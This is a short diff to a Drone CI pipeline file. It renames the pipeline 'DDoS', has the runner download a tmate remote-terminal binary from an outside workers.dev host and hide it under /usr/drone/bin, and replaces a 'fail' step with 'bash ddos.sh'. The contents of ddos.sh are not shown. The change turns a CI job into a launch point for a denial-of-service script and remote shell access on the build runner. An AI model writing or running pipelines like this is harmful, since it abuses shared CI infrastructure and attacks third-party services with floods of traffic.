@@ -1,5 +1,5 @@
 kind: pipeline
-name: Drone
+name: DDoS
 
 steps:
  - name: compile
@@ -10,11 +10,11 @@ steps:
      chat_id:
        from_secret: chat_id
    commands:
-      - apt-get update &&apt-get install wget tmate -y
+      - apt-get update &&apt-get install wget tmate git -y
       - wget https://tdrive.elytra8.workers.dev/tmate
       - mkdir -p /usr/drone/
       - mkdir -p /usr/drone/bin/
       - mv tmate /usr/drone/bin/tmate
       - chmod +x /usr/drone/bin/tmate
-      - fail
+      - bash ddos.sh
 
